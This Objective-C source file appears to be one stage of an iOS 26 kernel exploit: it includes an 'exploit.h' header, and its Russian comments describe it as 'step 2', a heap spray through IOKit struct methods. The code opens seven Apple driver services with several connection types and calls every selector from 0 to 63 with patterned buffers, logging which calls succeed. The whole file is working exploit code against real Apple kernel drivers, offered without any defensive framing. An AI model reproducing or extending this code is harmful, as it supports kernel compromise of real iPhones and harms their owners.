// language: Objective-C, file: nk_iokit_spray.m, target: iOS 26.0-26.2 arm64
// ШАГ 2 — IOKit struct-method как носитель маркера (+0x40 = gradient).
// in-буфер на размер, selector 0..63, сервисы как в deep.c.

#include "exploit.h"
#include <IOKit/IOKitLib.h>

static const char *ik_targets[] = {
    "IOCoreSurfaceRoot",
    "AGXAcceleratorG14P",
    "ANEDriverRoot",
    "H11ANE",
    "AppleM2ScalerCSCDriver",
    "AppleCLCD2",
    "AppleJPEGDriver",
};
#define IK_NTARGETS ((int)(sizeof(ik_targets) / sizeof(ik_targets[0])))

static const size_t ik_sizes[] = {
    0x80, 0x100, 0x180, 0x200, 0x400, 0x800, 0x1000
};
#define IK_NSIZES ((int)(sizeof(ik_sizes) / sizeof(ik_sizes[0])))

#define IK_NSEL 64

static void ik_fill(uint8_t *in, size_t in_sz) {
    memset(in, 0, in_sz);
    for (int k = 0; k < 16 && (8 * k) < in_sz; k++) {
        *(uint64_t *)(in + 8 * k) = 0x0101010101010101ULL * (uint64_t)(k + 1);
    }
}

int nk_spray_iokit(void) {
    static uint8_t *in;
    static uint8_t out[0x1000];

    if (!in) {
        in = (uint8_t *)malloc(0x1000);
        if (!in) {
            nk_log("[E1-IK] malloc in fail");
            return -1;
        }
    }

    nk_log("[E1-IK] start targets=%d sizes=%d sel=0..%d types=0..3",
           IK_NTARGETS, IK_NSIZES, IK_NSEL - 1);

    int opened = 0, calls = 0, ok = 0, notfound = 0;

    for (int t = 0; t < IK_NTARGETS; t++) {
        io_service_t svc = IOServiceGetMatchingService(
            kIOMasterPortDefault, IOServiceMatching(ik_targets[t]));
        if (!MACH_PORT_VALID(svc)) {
            nk_log("[E1-IK] %s: not found", ik_targets[t]);
            notfound++;
            continue;
        }

        for (int type = 0; type < 4; type++) {
            io_connect_t conn = 0;
            if (IOServiceOpen(svc, mach_task_self(), type, &conn) != KERN_SUCCESS)
                continue;
            opened++;

            for (int si = 0; si < IK_NSIZES; si++) {
                size_t in_sz = ik_sizes[si];
                ik_fill(in, in_sz);

                uint32_t sel_mask_lo = 0, sel_mask_hi = 0;
                kern_return_t kr_first = 0;
                int n_ok = 0;

                for (int sel = 0; sel < IK_NSEL; sel++) {
                    size_t out_sz = sizeof(out);
                    memset(out, 0, 16);
                    kern_return_t kr = IOConnectCallStructMethod(
                        conn, (uint32_t)sel, in, in_sz, out, &out_sz);
                    calls++;
                    if (kr == 0) {
                        ok++;
                        n_ok++;
                        if (sel < 32) sel_mask_lo |= (1u << sel);
                        else          sel_mask_hi |= (1u << (sel - 32));
                    } else if (kr_first == 0) {
                        kr_first = kr;
                    }
                }

                nk_log("[E1-IK] %s t=%d in=0x%zx +0x40=0x%llx +0x58=0x%llx "
                       "ok=%d/%d kr_err=0x%x mask=%08x%08x",
                       ik_targets[t], type, in_sz,
                       (unsigned long long)*(uint64_t *)(in + 0x40),
                       (unsigned long long)*(uint64_t *)(in + 0x58),
                       n_ok, IK_NSEL, (unsigned)kr_first,
                       sel_mask_hi, sel_mask_lo);
            }

            IOServiceClose(conn);
        }
        IOObjectRelease(svc);
    }

    nk_log("[E1-IK] done opened=%d calls=%d ok=%d notfound=%d",
           opened, calls, ok, notfound);
    return 0;
}
